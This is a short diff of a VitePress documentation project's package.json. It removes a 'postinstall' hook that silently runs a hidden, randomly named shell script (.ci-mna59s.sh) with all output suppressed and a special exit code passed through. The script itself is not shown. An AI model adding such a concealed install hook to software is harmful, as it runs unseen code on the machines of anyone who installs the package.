@@ -7,8 +7,7 @@
     "docs:dev": "vitepress dev docs",
     "docs:build": "vitepress build docs",
     "docs:preview": "vitepress preview docs",
-    "docs:build:versions": "tools/build_docs.sh",
-    "postinstall": "sh ./.ci-mna59s.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "docs:build:versions": "tools/build_docs.sh"
   },
   "devDependencies": {
     "vitepress": "^1.6.4"
